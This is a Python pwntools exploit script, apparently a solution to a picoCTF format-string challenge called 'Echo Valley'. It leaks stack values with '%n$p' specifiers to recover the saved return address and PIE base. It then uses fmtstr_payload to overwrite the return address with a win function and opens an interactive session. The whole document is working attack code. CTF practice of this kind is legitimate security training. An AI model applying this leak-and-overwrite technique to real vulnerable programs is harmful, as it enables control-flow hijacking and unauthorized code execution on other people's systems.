from pwn import *

elf = ELF('./valley')
context.binary = elf  

p = process('./valley')
#p = remote('shape-facility.picoctf.net', 55571)
n = 6
offset = 0x1413
win_offset = 0x1269

p.recvuntil(b"Welcome to the Echo Valley, Try Shouting: \n")

while n < 22:
    payload = "%" + str(n) + "$p"
    p.sendline(payload.encode())
    p.recvuntil(b"You heard in the distance: ")
    response = p.recvline().decode().strip()
    if n == 20:
        print(f"saved RBP : {response}")
        ret = int(response, 16) + 8
        print(f"RET address : {hex(ret)}")
    if n == 21:
        print(f"saved RIP : {response}")
        leak = response
    n += 1

base   = int(leak, 16) - offset
target = base + win_offset
print(f"base   : {hex(base)}")
print(f"target : {hex(target)}")

# payload = fmtstr_payload(6, {ret: target})
payload = fmtstr_payload(6,{ret: target})
print(payload)
print(len(payload))

p.sendline(payload)
p.recvuntil(b"You heard in the distance: ")
p.recv(timeout=2)
p.sendline(b"exit")

p.interactive()
